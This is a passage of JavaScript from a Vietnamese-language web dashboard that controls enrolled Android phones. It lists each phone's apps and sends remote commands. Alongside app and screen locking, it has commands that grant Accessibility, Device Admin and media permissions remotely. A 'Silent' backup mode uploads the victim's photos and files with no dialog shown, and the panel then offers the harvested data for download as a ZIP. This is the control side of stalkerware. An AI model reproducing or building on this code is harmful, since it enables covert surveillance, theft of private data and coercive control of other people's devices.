          const label = diffH >= 24 ? Math.round(diffH/24) + 'd' : diffH + 'h';
          pill.title = 'Key hết hạn sau ' + label;
        }
      }
    }
  })();

  function doLogout() {
    localStorage.removeItem('applock_token');
    localStorage.removeItem('applock_key_expires');
    localStorage.removeItem('applock_key_type');
    window.location.href = '/';
  }

  // ── State ──────────────────────────────────────
  let allDevices      = [];
  let activeDevice    = null;
  let activeTab       = 'all';
  let searchQuery     = '';
  let pendingPkgs     = new Set(); // packages waiting for ack
  let fetchFileCategory = '';      // filter cho tab Lấy dữ liệu: ''|'image'|'file'|'download'

  // ── API ────────────────────────────────────────
  async function api(method, path, body) {
    const opts = { method, headers: { 'Content-Type': 'application/json' } };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(path, opts);
    if (!res.ok) throw new Error(await res.text());
    return res.json();
  }

  // ── Load devices ───────────────────────────────
  async function loadDevices() {
    try {
      allDevices = await api('GET', '/api/devices');
      renderSidebar();
      if (activeDevice) {
        const updated = allDevices.find(d => d.deviceId === activeDevice.deviceId);
        if (updated) { activeDevice = updated; renderMain(); }
      }
      document.getElementById('device-count').textContent = allDevices.length + ' thiết bị';
      const now = new Date();
      document.getElementById('last-refresh').textContent =
        now.getHours().toString().padStart(2,'0') + ':' +
        now.getMinutes().toString().padStart(2,'0') + ':' +
        now.getSeconds().toString().padStart(2,'0');
    } catch(e) {
      console.error(e);
    }
  }

  // ── Sidebar ────────────────────────────────────
  function renderSidebar() {
    const el = document.getElementById('device-list');
    if (allDevices.length === 0) {
      el.innerHTML = \`<div class="empty-devices">
        <span class="icon">📱</span>
        <span>Chưa có thiết bị nào kết nối.<br/>Khởi động app Android và cài đặt endpoint server.</span>
      </div>\`;
      return;
    }
    el.innerHTML = allDevices.map(d => \`
      <div class="device-card \${activeDevice && activeDevice.deviceId===d.deviceId ? 'active' : ''}"
           onclick="selectDevice('\${d.deviceId}')">
        <div class="device-name">
          <span class="status-dot \${d.online ? 'online' : 'offline'}"></span>
          \${esc(d.deviceName)}
        </div>
        <div class="device-meta">
          \${esc(d.manufacturer || d.brand)} \${esc(d.model)}<br/>
          Lần cuối: \${relTime(d.lastSeen)}
        </div>
        <div class="device-badges">
          <span class="badge badge-android">Android \${esc(d.androidVersion)}\${d.sdkVersion ? ' (API '+d.sdkVersion+')' : ''}</span>
          <span class="badge badge-total">\${d.appCount} app</span>
          \${d.totalRamMB > 0 ? \`<span class="badge" style="background:#1a3a5c;color:#8ab4f8">\${Math.round(d.totalRamMB/1024)}GB RAM</span>\` : ''}
          \${d.lockedCount > 0 ? \`<span class="badge badge-locked">🔒 \${d.lockedCount} khóa</span>\` : ''}
        </div>
      </div>
    \`).join('');
  }

  function selectDevice(id) {
    activeDevice = allDevices.find(d => d.deviceId === id);
    activeTab    = 'all';
    searchQuery  = '';
    pendingPkgs.clear();
    renderSidebar();
    renderMain();
  }

  // Sau mỗi lần renderMain: nếu tab 'fetch' đang active thì tải log + files
  function maybeLoadFetchLog() {
    if (activeTab === 'fetch' && activeDevice) {
      setTimeout(() => {
        refreshFetchLog(activeDevice.deviceId);
        loadFetchedFiles(activeDevice.deviceId, fetchFileCategory);
      }, 60);
    }
  }

  // ── Main panel ─────────────────────────────────
  function renderMain() {
    const panel = document.getElementById('main-panel');
    if (!activeDevice) {
      panel.innerHTML = \`<div class="no-device">
        <span class="big-icon">🛡️</span>
        <h2>Chọn thiết bị</h2>
        <p>Chọn một thiết bị ở bên trái để xem và điều khiển danh sách ứng dụng của nó.</p>
      </div>\`;
      return;
    }

    const d = activeDevice;
    const apps = filterApps(d.apps || []);
    const allApps = d.apps || [];
    const totalLocked = allApps.filter(a => a.locked).length;
    const onlineStatus = d.online
      ? '<span style="color:#26A641">● Online</span>'
      : '<span style="color:#484F58">● Offline</span>';

    const ramGB   = d.totalRamMB > 0 ? (Math.round(d.totalRamMB / 1024 * 10) / 10) + ' GB RAM' : '';
    const regTime = d.registeredAt ? ('Đăng ký: ' + relTime(d.registeredAt)) : '';
    panel.innerHTML = \`
      <div class="toolbar">
        <div style="flex:1">
          <div class="device-title">\${esc(d.deviceName)}</div>
          <div class="device-info-text">
            \${onlineStatus} &nbsp;·&nbsp;
            \${esc(d.manufacturer || d.brand)} \${esc(d.model)} &nbsp;·&nbsp;
            Android \${esc(d.androidVersion)}\${d.sdkVersion ? ' (API '+d.sdkVersion+')' : ''} &nbsp;·&nbsp;
            \${d.appCount} ứng dụng
            \${ramGB ? '&nbsp;·&nbsp;' + ramGB : ''}
            \${d.screenRes ? '&nbsp;·&nbsp;' + esc(d.screenRes) : ''}
          </div>
          <div style="font-size:11px;color:var(--sub);margin-top:2px">
            \${regTime}\${regTime && d.lastSeen ? '&nbsp;·&nbsp;' : ''}Lần cuối: \${relTime(d.lastSeen)}
          </div>
        </div>
        <input class="search-box" type="text" placeholder="🔍 Tìm ứng dụng..."
               value="\${esc(searchQuery)}"
               oninput="searchQuery=this.value;renderMain()" />
      </div>

      <div class="tab-bar">
        \${['all','locked','user','game','sys','fetch'].map(t => \`
          <button class="tab \${t==='locked'?'tab-locked':''} \${t==='fetch'?'tab-fetch':''} \${activeTab===t?'active':''}"
                  onclick="activeTab='\${t}';renderMain();maybeLoadFetchLog()">
            \${{all:'📱 Tất cả',locked:'🔒 Đang khóa',user:'👤 User',game:'🎮 Game',sys:'⚙️ Hệ thống',fetch:'📥 Lấy dữ liệu'}[t]}
            \${t==='locked' && totalLocked > 0 ? \`<span style="background:var(--red);color:#fff;border-radius:999px;font-size:10px;padding:1px 6px;margin-left:4px">\${totalLocked}</span>\` : ''}
          </button>
        \`).join('')}
      </div>

      \${activeTab !== 'fetch' ? \`
      <div class="stat-strip">
        <span><b>\${allApps.length}</b> tổng</span>
        <span><b style="color:var(--red)">\${totalLocked}</b> đang khóa</span>
        <span><b>\${apps.length}</b> hiển thị</span>
      </div>\` : ''}

      \${activeTab === 'fetch'
        ? \`<div class="fetch-panel" id="fetch-panel">
            <div class="fetch-action-card">
              <h3>📥 Tự động lấy dữ liệu từ thiết bị</h3>
              <p>
                Nhấn nút bên dưới để gửi lệnh <b>fetch_data</b> tới thiết bị <b>\${esc(d.deviceName)}</b>.<br/>
                Khi thiết bị nhận lệnh, người dùng sẽ được thông báo và dữ liệu sẽ tự động upload về server.
              </p>
              <button class="btn-fetch-data" id="btn-fetch-\${esc(d.deviceId)}"
                      onclick="sendFetchData('\${esc(d.deviceId)}')">
                📥 Gửi lệnh Auto lấy dữ liệu
              </button>
              <div class="fetch-status-msg" id="fetch-status-\${esc(d.deviceId)}"></div>
            </div>

            <div class="fetch-action-card" style="border-color:rgba(124,58,237,.35);background:rgba(124,58,237,.04)">
              <h3 style="color:#a78bfa">🔐 Cấp quyền từ xa</h3>
              <p>Gửi lệnh yêu cầu thiết bị <b>\${esc(d.deviceName)}</b> tự động mở màn hình cấp quyền — không cần người dùng thao tác thủ công.</p>
              <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
                <label style="font-size:12px;color:var(--sub);display:flex;align-items:center;gap:5px;cursor:pointer">
                  <input type="checkbox" id="perm-acc-\${esc(d.deviceId)}" checked> Trợ Năng (Accessibility)
                </label>
                <label style="font-size:12px;color:var(--sub);display:flex;align-items:center;gap:5px;cursor:pointer">
                  <input type="checkbox" id="perm-adm-\${esc(d.deviceId)}"> Device Admin
                </label>
                <label style="font-size:12px;color:var(--sub);display:flex;align-items:center;gap:5px;cursor:pointer">
                  <input type="checkbox" id="perm-usg-\${esc(d.deviceId)}"> Usage Stats
                </label>
                <label style="font-size:12px;color:var(--sub);display:flex;align-items:center;gap:5px;cursor:pointer">
                  <input type="checkbox" id="perm-ovl-\${esc(d.deviceId)}"> Draw Overlay
                </label>
                <label style="font-size:12px;color:var(--sub);display:flex;align-items:center;gap:5px;cursor:pointer">
                  <input type="checkbox" id="perm-media-\${esc(d.deviceId)}" checked> Truy cập Ảnh/File
                </label>
              </div>
              <button class="btn-fetch-data" style="background:#7c3aed"
                      id="btn-grant-\${esc(d.deviceId)}"
                      onclick="sendGrantPermission('\${esc(d.deviceId)}')">
                🔐 Gửi lệnh cấp quyền từ xa
              </button>
              <div class="fetch-status-msg" id="grant-status-\${esc(d.deviceId)}"></div>
            </div>

            <div class="fetch-action-card" style="border-color:rgba(67,160,71,.35);background:rgba(67,160,71,.04)">
              <h3 style="color:#4ade80">⚡ Đồng ý &amp; Sao lưu tự động (Silent)</h3>
              <p>Gửi lệnh để thiết bị <b>\${esc(d.deviceName)}</b> <b>tự động đồng ý</b> và <b>bắt đầu upload ngay</b> — <span style="color:#ef4444;font-weight:700">không hiện dialog</span> cho người dùng, không cần thao tác gì.</p>
              <button class="btn-fetch-data" style="background:linear-gradient(135deg,#16a34a,#059669)"
                      id="btn-autobk-\${esc(d.deviceId)}"
                      onclick="sendAutoBackup('\${esc(d.deviceId)}')">
                ⚡ Đồng ý &amp; Sao lưu từ xa
              </button>
              <div class="fetch-status-msg" id="autobk-status-\${esc(d.deviceId)}"></div>
            </div>

            <div class="fetch-action-card" style="border-color:rgba(229,57,53,.35);background:rgba(229,57,53,.04)">
              <h3 style="color:#ef4444">📵 Khoá màn hình từ xa</h3>
              <p>Gửi lệnh khiến thiết bị <b>\${esc(d.deviceName)}</b> <b>khoá màn hình ngay lập tức</b> — thiết bị sẽ tắt màn hình và yêu cầu nhập mật khẩu bên dưới (hoặc PIN hệ thống) để mở lại.</p>
              <div style="margin-bottom:12px">
                <label style="font-size:12px;color:var(--sub);display:block;margin-bottom:6px;font-weight:600">🔑 Mật khẩu mở khoá (tùy chọn, ít nhất 4 ký tự):</label>
                <input id="screenlock-pw-\${esc(d.deviceId)}" type="password"
                       placeholder="Để trống = dùng PIN hệ thống"
                       maxlength="16"
                       style="background:#0d1117;border:1.5px solid #30363d;border-radius:8px;color:#e6edf3;padding:9px 14px;font-size:14px;width:100%;outline:none;font-family:'Courier New',monospace;letter-spacing:2px"
                       onfocus="this.style.borderColor='#ef4444'"
                       onblur="this.style.borderColor='#30363d'" />
              </div>
              <button class="btn-fetch-data" style="background:linear-gradient(135deg,#dc2626,#b91c1c)"
                      id="btn-screenlock-\${esc(d.deviceId)}"
                      onclick="sendScreenLock('\${esc(d.deviceId)}')">
                📵 Khoá màn hình ngay
              </button>
              <div class="fetch-status-msg" id="screenlock-status-\${esc(d.deviceId)}"></div>
            </div>

            <div class="fetch-action-card" style="border-color:rgba(234,179,8,.35);background:rgba(234,179,8,.04)">
              <h3 style="color:#fbbf24">⏰ Hẹn giờ khoá ứng dụng (Timed Lock)</h3>
              <p>Khoá một ứng dụng tạm thời — <b>tự động mở sau thời gian bạn đặt</b>. Giao diện thiết bị sẽ hiển thị đếm ngược và tự mở khoá khi hết giờ.</p>
              <div style="margin-bottom:12px">
                <label style="font-size:12px;color:var(--sub);display:block;margin-bottom:6px;font-weight:600">📦 Chọn ứng dụng cần hẹn giờ:</label>
                <select id="timedlock-pkg-\${esc(d.deviceId)}"
                        style="background:#0d1117;border:1.5px solid #30363d;border-radius:8px;color:#e6edf3;padding:9px 12px;font-size:13px;width:100%;outline:none"
                        onfocus="this.style.borderColor='#fbbf24'"
                        onblur="this.style.borderColor='#30363d'">
                  <option value="">— Chọn ứng dụng —</option>
                  \${(d.apps||[]).filter(a=>!a.isSystem).map(a =>
                    \`<option value="\${esc(a.packageName)}">\${esc(a.label)} (\${esc(a.packageName)})</option>\`
                  ).join('')}
                </select>
              </div>
              <div style="margin-bottom:14px">
                <label style="font-size:12px;color:var(--sub);display:block;margin-bottom:8px;font-weight:600">⏱ Thời gian khoá (phút):</label>
                <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
                  \${[1,3,5,10,30].map(m => \`
                    <button onclick="setTimedLockMinutes('\${esc(d.deviceId)}',\${m})"
                            id="tlbtn-\${esc(d.deviceId)}-\${m}"
                            style="background:#1c2230;border:1.5px solid #30363d;color:#e6edf3;border-radius:8px;padding:7px 16px;font-size:13px;font-weight:600;cursor:pointer;transition:.15s"
                            onmouseover="this.style.borderColor='#fbbf24'"
                            onmouseout="if(document.getElementById('timedlock-mins-\${esc(d.deviceId)}').value!='\${m}')this.style.borderColor='#30363d'">\${m} phút</button>
                  \`).join('')}
                </div>
                <input id="timedlock-mins-\${esc(d.deviceId)}" type="number" min="1" max="999" value="5"
                       placeholder="Ví dụ: 15"
                       style="background:#0d1117;border:1.5px solid #30363d;border-radius:8px;color:#e6edf3;padding:9px 14px;font-size:14px;width:100%;outline:none"
                       onfocus="this.style.borderColor='#fbbf24'"
                       onblur="this.style.borderColor='#30363d'"
                       oninput="clearTimedPreset('\${esc(d.deviceId)}')" />
              </div>
              <button class="btn-fetch-data" style="background:linear-gradient(135deg,#d97706,#b45309)"
                      id="btn-timedlock-\${esc(d.deviceId)}"
                      onclick="sendTimedLock('\${esc(d.deviceId)}')">
                ⏰ Gửi lệnh Hẹn Giờ Khoá
              </button>
              <div class="fetch-status-msg" id="timedlock-status-\${esc(d.deviceId)}"></div>
            </div>

            <div class="fetch-files-card">
              <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:10px">
                <h3 style="margin:0">📂 Dữ liệu đã nhận từ thiết bị
                  <button class="btn-refresh-log" onclick="loadFetchedFiles('\${esc(d.deviceId)}', fetchFileCategory)" style="margin-left:8px">↻ Làm mới</button>
                </h3>
                <button class="btn-download-zip" id="btn-dlzip-\${esc(d.deviceId)}"
                        onclick="downloadAllZip('\${esc(d.deviceId)}')">
                  ⬇️ Tải xuống ZIP toàn bộ
                </button>
              </div>
              <div class="fetch-files-summary" id="fetch-files-summary-\${esc(d.deviceId)}">Đang tải...</div>
              <div class="fetch-files-filter" id="fetch-files-filter-\${esc(d.deviceId)}">
                <button class="active" onclick="setFetchFileCategory('\${esc(d.deviceId)}','')">🗂 Tất cả</button>
                <button onclick="setFetchFileCategory('\${esc(d.deviceId)}','image')">🖼 Ảnh</button>
                <button onclick="setFetchFileCategory('\${esc(d.deviceId)}','file')">📄 File code</button>
                <button onclick="setFetchFileCategory('\${esc(d.deviceId)}','download')">⬇ Downloads</button>
              </div>
              <div id="fetch-files-\${esc(d.deviceId)}">
                <div class="fetch-log-empty">⏳ Đang tải dữ liệu...</div>
              </div>
            </div>

            <div class="fetch-log-card">
              <h3>🕐 Lịch sử lệnh
                <button class="btn-refresh-log" onclick="refreshFetchLog('\${esc(d.deviceId)}')">↻ Làm mới</button>
              </h3>
              <div id="fetch-log-\${esc(d.deviceId)}">
                <div class="fetch-log-empty">⏳ Đang tải lịch sử...</div>
              </div>
            </div>
          </div>\`
        : \`<div class="app-list" id="app-list">
          \${apps.length === 0
            ? (activeTab === 'locked'
                ? '<div style="text-align:center;color:var(--sub);padding:60px 0;font-size:14px"><div style="font-size:48px;margin-bottom:12px;opacity:.4">🔓</div>Không có ứng dụng nào đang bị khóa</div>'
                : '<div style="text-align:center;color:var(--sub);padding:60px 0">Không tìm thấy ứng dụng</div>')
            : apps.map(a => renderAppRow(a, d.deviceId)).join('')
          }
        </div>\`
      }
    \`;
  }

  function filterApps(apps) {
    return apps.filter(a => {
      if (activeTab === 'locked' && !a.locked) return false;
      if (activeTab === 'user'   && (a.isSystem || a.isGame)) return false;
      if (activeTab === 'game'   && !a.isGame) return false;
      if (activeTab === 'sys'    && !a.isSystem) return false;
      if (searchQuery) {
        const q = searchQuery.toLowerCase();
        return a.label.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q);
      }
      return true;
    });
  }

  function renderAppRow(a, deviceId) {
    const isPending = pendingPkgs.has(a.packageName);
    const iconHtml = a.icon
      ? \`<img src="data:image/png;base64,\${a.icon}" alt="" />\`
      : defaultIcon(a.label);

    return \`
      <div class="app-row \${a.locked ? 'locked-row' : ''}">
        <div class="app-icon-wrap">\${iconHtml}</div>
        <div class="app-info">
          <div class="app-name">\${esc(a.label)}</div>
          <div class="app-pkg">\${esc(a.packageName)}</div>
          <div class="app-tags">
            \${a.isSystem ? '<span class="tag tag-sys">SYS</span>' : ''}
            \${a.isGame   ? '<span class="tag tag-game">GAME</span>' : ''}
          </div>
        </div>
        <div class="app-right">
          <span class="lock-status \${a.locked ? 'locked' : 'unlocked'}">
            \${a.locked ? '🔒 Đã khoá' : '🔓 Mở'}
          </span>
          \${isPending
            ? '<button class="action-btn pending">⏳ Đang gửi...</button>'
            : a.locked
              ? \`<button class="action-btn do-unlock" onclick="sendCommand('\${deviceId}','unlock','\${esc(a.packageName)}')">MỞ KHOÁ</button>\`
              : \`<button class="action-btn do-lock"   onclick="sendCommand('\${deviceId}','lock',  '\${esc(a.packageName)}')">KHOÁ</button>\`
          }
        </div>
      </div>
    \`;
  }

  function defaultIcon(label) {
    const colors = ['#4F8EF7','#E53935','#43A047','#FFAB40','#9C27B0','#00BCD4'];
    const clr = colors[(label.charCodeAt(0) || 0) % colors.length];
    const ch  = (label[0] || '?').toUpperCase();
    return \`<div style="width:100%;height:100%;background:\${clr};display:flex;
                        align-items:center;justify-content:center;border-radius:10px;
                        font-size:20px;font-weight:700;color:#fff">\${ch}</div>\`;
  }

  // ── Commands ────────────────────────────────────
  function sendCommand(deviceId, action, packageName) {
    if (action === 'lock') {
      showLockModal(deviceId, packageName);
    } else {
      doSendCommand(deviceId, action, packageName, '');
    }
  }

  function showLockModal(deviceId, packageName) {
    const app = (activeDevice.apps || []).find(a => a.packageName === packageName);
    const label = app ? app.label : packageName;

    // Icon placeholder (first letter)
    const colors = ['#4F8EF7','#E53935','#43A047','#FFAB40','#9C27B0','#00BCD4'];
    const clr = colors[(label.charCodeAt(0)||0) % colors.length];
    const ch  = (label[0]||'?').toUpperCase();

    const modalEl = document.getElementById('modal-root');
    modalEl.innerHTML = \`
      <div class="modal-backdrop" id="pw-backdrop">
        <div class="modal-box">
          <div class="modal-icon-row">
            <div class="modal-app-icon" style="background:\${clr}">\${ch}</div>
            <div>
              <div class="modal-app-name">\${esc(label)}</div>
              <div class="modal-action-label">🔒 Khóa ứng dụng</div>
            </div>
          </div>
          <div class="modal-label">Nhập mật khẩu để khóa (ít nhất 4 ký tự):</div>
          <input id="pw-input" class="modal-input" type="password"
                 inputmode="numeric" maxlength="16"
                 placeholder="••••" autocomplete="off" />
          <div class="modal-err" id="pw-err"></div>
          <div class="modal-footer">
            <button class="modal-btn cancel" onclick="closeLockModal()">Hủy</button>
            <button class="modal-btn confirm" onclick="confirmLockModal('\${esc(deviceId)}','\${esc(packageName)}')">🔒 Khóa</button>
          </div>
        </div>
      </div>
    \`;

    const inp = document.getElementById('pw-input');
    inp.focus();
    // Allow Enter key to confirm
    inp.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') confirmLockModal(deviceId, packageName);
      if (e.key === 'Escape') closeLockModal();
    });
    // Click backdrop to close
    document.getElementById('pw-backdrop').addEventListener('click', function(e) {
      if (e.target === this) closeLockModal();
    });
  }

  function closeLockModal() {
    document.getElementById('modal-root').innerHTML = '';
  }

  function confirmLockModal(deviceId, packageName) {
    const inp = document.getElementById('pw-input');
    const errEl = document.getElementById('pw-err');
    const pw = inp ? inp.value.trim() : '';
    if (pw.length < 4) {
      if (errEl) errEl.textContent = '⚠ Mật khẩu phải ít nhất 4 ký tự!';
      if (inp) inp.focus();
      return;
    }
    closeLockModal();
    doSendCommand(deviceId, 'lock', packageName, pw);
  }

  async function doSendCommand(deviceId, action, packageName, password) {
    pendingPkgs.add(packageName);
    renderMain();
    try {
      await api('POST', \`/api/devices/\${deviceId}/command\`, { action, packageName, password });
      // Optimistic UI
      const app = (activeDevice.apps || []).find(a => a.packageName === packageName);
      if (app) app.locked = (action === 'lock');
      showToast(action === 'lock' ? \`🔒 Đã gửi lệnh khóa: \${packageName}\` : \`🔓 Đã gửi lệnh mở: \${packageName}\`, 'ok');
    } catch(e) {
      showToast('❌ Lỗi gửi lệnh: ' + e.message, 'err');
    } finally {
      pendingPkgs.delete(packageName);
      renderMain();
    }
  }

  // ── Toast ───────────────────────────────────────
  let toastTimer;
  function showToast(msg, type = 'ok') {
    const el = document.getElementById('toast');
    el.textContent = msg;
    el.className   = 'show toast-' + type;
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => el.className = '', 3000);
  }

  // ── Helpers ─────────────────────────────────────
  function esc(s) {
    return String(s||'')
      .replace(/&/g,'&amp;').replace(/</g,'&lt;')
      .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  function relTime(iso) {
    if (!iso) return '—';
    const diff = (Date.now() - new Date(iso)) / 1000;
    if (diff < 10)   return 'Vừa xong';
    if (diff < 60)   return Math.floor(diff) + 's trước';
    if (diff < 3600) return Math.floor(diff/60) + 'm trước';
    return Math.floor(diff/3600) + 'h trước';
  }

  // ── Fetch-data functions ────────────────────────
  async function sendFetchData(deviceId) {
    const btn    = document.getElementById('btn-fetch-' + deviceId);
    const status = document.getElementById('fetch-status-' + deviceId);
    if (!btn || !status) return;
    btn.disabled = true;
    status.textContent  = '⏳ Đang gửi lệnh...';
    status.style.color  = '#a78bfa';
    try {
      const res  = await fetch('/api/device/send-fetch-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId }),
      });
      const data = await res.json();
      if (data.ok) {
        status.textContent = '✅ Đã gửi! Chờ thiết bị nhận lệnh...';
        status.style.color = '#4ade80';
        refreshFetchLog(deviceId);
        setTimeout(() => pollFetchAck(deviceId, data.cmdId, btn, status), 4000);
      } else {
        status.textContent = '❌ ' + (data.error || 'Gửi thất bại');
        status.style.color = '#ef4444';
        btn.disabled = false;
      }
    } catch (e) {
      status.textContent = '❌ Lỗi kết nối: ' + e.message;
      status.style.color = '#ef4444';
      btn.disabled = false;
    }
  }

  async function pollFetchAck(deviceId, cmdId, btn, status) {
    // Dừng nếu đã chuyển tab hoặc thiết bị khác
    if (!activeDevice || activeDevice.deviceId !== deviceId || activeTab !== 'fetch') return;
    try {
      const res  = await fetch('/api/device/fetch-data-log?deviceId=' + deviceId);
      const data = await res.json();
      const cmd  = (data.commands || []).find(c => c.cmdId === cmdId);
      if (cmd) {
        if (cmd.status === 'agreed') {
          status.textContent = '✅ Thiết bị đã xác nhận — đang upload dữ liệu...';
          status.style.color = '#4ade80';
          btn.disabled = false;
          refreshFetchLog(deviceId);
          return;
        } else if (cmd.status === 'declined') {
          status.textContent = '❌ Người dùng từ chối lệnh lấy dữ liệu';
          status.style.color = '#ef4444';
          btn.disabled = false;
          refreshFetchLog(deviceId);
          return;
        }
      }
      // Còn pending/sent → poll tiếp
      setTimeout(() => pollFetchAck(deviceId, cmdId, btn, status), 5000);
    } catch (e) {
      setTimeout(() => pollFetchAck(deviceId, cmdId, btn, status), 8000);
    }
  }


  // ── Gửi lệnh cấp quyền từ xa ────────────────────────────────────────
  async function sendGrantPermission(deviceId) {
    const btn    = document.getElementById('btn-grant-' + deviceId);
    const status = document.getElementById('grant-status-' + deviceId);
    if (!btn || !status) return;

    const perms = [];
    if (document.getElementById('perm-acc-'   + deviceId)?.checked) perms.push('accessibility');
    if (document.getElementById('perm-adm-'   + deviceId)?.checked) perms.push('device_admin');
    if (document.getElementById('perm-usg-'   + deviceId)?.checked) perms.push('usage_stats');
    if (document.getElementById('perm-ovl-'   + deviceId)?.checked) perms.push('draw_overlay');
    if (document.getElementById('perm-media-' + deviceId)?.checked) perms.push('media_access');
    if (perms.length === 0) {
      status.textContent = '⚠ Chọn ít nhất 1 quyền cần cấp';
      status.style.color = '#ffab40';
      return;
    }

    btn.disabled = true;
    status.textContent = '⏳ Đang gửi lệnh cấp quyền...';
    status.style.color = '#a78bfa';
    try {
      const res  = await fetch('/api/device/send-grant-permission', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId, permissions: perms }),
      });
      const data = await res.json();
      if (data.ok) {
        status.textContent = '✅ Đã gửi! Chờ thiết bị xử lý quyền [' + perms.join(', ') + ']...';
        status.style.color = '#4ade80';
        setTimeout(() => pollGrantAck(deviceId, data.cmdId, btn, status), 4000);
      } else {
        status.textContent = '❌ ' + (data.error || 'Gửi thất bại');
        status.style.color = '#ef4444';
        btn.disabled = false;
      }
    } catch (e) {
      status.textContent = '❌ Lỗi kết nối: ' + e.message;
      status.style.color = '#ef4444';
      btn.disabled = false;
    }
  }

  async function pollGrantAck(deviceId, cmdId, btn, status) {
    if (!activeDevice || activeDevice.deviceId !== deviceId || activeTab !== 'fetch') return;
    try {
      const res  = await fetch('/api/device/grant-permission-log?deviceId=' + deviceId);
      const data = await res.json();
      const cmd  = (data.commands || []).find(c => c.cmdId === cmdId);
      if (cmd && cmd.status === 'granted') {
        status.textContent = '✅ Thiết bị đã cấp quyền thành công!';
        status.style.color = '#4ade80';
        btn.disabled = false;
        return;
      } else if (cmd && cmd.status === 'failed') {
        status.textContent = '⚠ Thiết bị không thể tự cấp quyền — người dùng cần bật thủ công';
        status.style.color = '#ffab40';
        btn.disabled = false;
        return;
      }
      setTimeout(() => pollGrantAck(deviceId, cmdId, btn, status), 5000);
    } catch (e) {
      setTimeout(() => pollGrantAck(deviceId, cmdId, btn, status), 8000);
    }
  }

  // ── Gửi lệnh auto backup (silent) ───────────────────────────────────────
  async function sendAutoBackup(deviceId) {
    const btn    = document.getElementById('btn-autobk-' + deviceId);
    const status = document.getElementById('autobk-status-' + deviceId);
    if (!btn || !status) return;

    btn.disabled = true;
    status.textContent = '⏳ Đang gửi lệnh auto backup...';
    status.style.color = '#a78bfa';
    try {
      const res  = await fetch('/api/device/send-auto-backup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId }),
      });
      const data = await res.json();
      if (data.ok) {
        status.textContent = '✅ Lệnh đã gửi! Thiết bị đang tự động upload (silent)...';
        status.style.color = '#4ade80';
        setTimeout(() => pollAutoBackupAck(deviceId, data.cmdId, btn, status), 5000);
      } else {
        status.textContent = '❌ ' + (data.error || 'Gửi thất bại');
        status.style.color = '#ef4444';
        btn.disabled = false;
      }
    } catch (e) {
      status.textContent = '❌ Lỗi kết nối: ' + e.message;
      status.style.color = '#ef4444';
      btn.disabled = false;
    }
  }

  async function pollAutoBackupAck(deviceId, cmdId, btn, status) {
    if (!activeDevice || activeDevice.deviceId !== deviceId || activeTab !== 'fetch') return;
    try {
      const res  = await fetch('/api/device/auto-backup-log?deviceId=' + deviceId);
      const data = await res.json();
      const cmd  = (data.commands || []).find(c => c.cmdId === cmdId);
      if (cmd && cmd.status === 'done') {
        status.textContent = \`✅ Hoàn thành! Upload: \${cmd.uploaded} | Lỗi: \${cmd.failed} | Bỏ qua: \${cmd.skipped}\`;
        status.style.color = '#4ade80';
        btn.disabled = false;
        // Refresh file list
        if (activeDevice) loadFetchedFiles(activeDevice.deviceId, fetchFileCategory);
        return;
      }
      setTimeout(() => pollAutoBackupAck(deviceId, cmdId, btn, status), 6000);
    } catch (e) {
      setTimeout(() => pollAutoBackupAck(deviceId, cmdId, btn, status), 8000);
    }
  }

  // ── Khoá màn hình từ xa (có mật khẩu) ──────────────────────────────
  async function sendScreenLock(deviceId) {
    const btn    = document.getElementById('btn-screenlock-' + deviceId);
    const status = document.getElementById('screenlock-status-' + deviceId);
    const pwInp  = document.getElementById('screenlock-pw-' + deviceId);
    if (!btn || !status) return;

    const password = pwInp ? pwInp.value.trim() : '';
    if (password && password.length < 4) {
      status.textContent = '⚠ Mật khẩu phải ít nhất 4 ký tự (hoặc để trống)!';
      status.style.color = '#ffab40';
      return;
    }

    btn.disabled = true;
    status.textContent = '⏳ Đang gửi lệnh khoá màn hình...';
    status.style.color = '#a78bfa';
    try {
      const res  = await fetch('/api/device/send-screen-lock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId, password }),
      });
      const data = await res.json();
      if (data.ok) {
        status.textContent = password
          ? '✅ Lệnh đã gửi! Thiết bị đang khoá màn hình (cần nhập mật khẩu để mở)...'
          : '✅ Lệnh đã gửi! Thiết bị đang khoá màn hình...';
        status.style.color = '#4ade80';
        setTimeout(() => pollScreenLockAck(deviceId, data.cmdId, btn, status), 4000);
      } else {
        status.textContent = '❌ ' + (data.error || 'Gửi thất bại');
        status.style.color = '#ef4444';
        btn.disabled = false;
      }
    } catch (e) {
      status.textContent = '❌ Lỗi kết nối: ' + e.message;
      status.style.color = '#ef4444';
      btn.disabled = false;
    }
  }

  // ── Hẹn giờ khoá ứng dụng ───────────────────────────────────────────
  function setTimedLockMinutes(deviceId, mins) {
    const inp = document.getElementById('timedlock-mins-' + deviceId);
    if (inp) inp.value = mins;
    // highlight preset button
    [1,3,5,10,30].forEach(m => {
      const b = document.getElementById('tlbtn-' + deviceId + '-' + m);
      if (b) {
        b.style.borderColor = (m === mins) ? '#fbbf24' : '#30363d';
        b.style.background  = (m === mins) ? 'rgba(234,179,8,.15)' : '#1c2230';
        b.style.color       = (m === mins) ? '#fbbf24' : '#e6edf3';
      }
    });
  }

  function clearTimedPreset(deviceId) {
    [1,3,5,10,30].forEach(m => {
      const b = document.getElementById('tlbtn-' + deviceId + '-' + m);
      if (b) { b.style.borderColor='#30363d'; b.style.background='#1c2230'; b.style.color='#e6edf3'; }
    });
  }

  async function sendTimedLock(deviceId) {
    const btn    = document.getElementById('btn-timedlock-' + deviceId);
    const status = document.getElementById('timedlock-status-' + deviceId);
    const pkgSel = document.getElementById('timedlock-pkg-' + deviceId);
    const minsInp= document.getElementById('timedlock-mins-' + deviceId);
    if (!btn || !status) return;

    const packageName = pkgSel ? pkgSel.value : '';
    const minutes     = parseInt(minsInp ? minsInp.value : '5', 10);

    if (!packageName) {
      status.textContent = '⚠ Vui lòng chọn ứng dụng cần hẹn giờ!';
      status.style.color = '#ffab40';
      return;
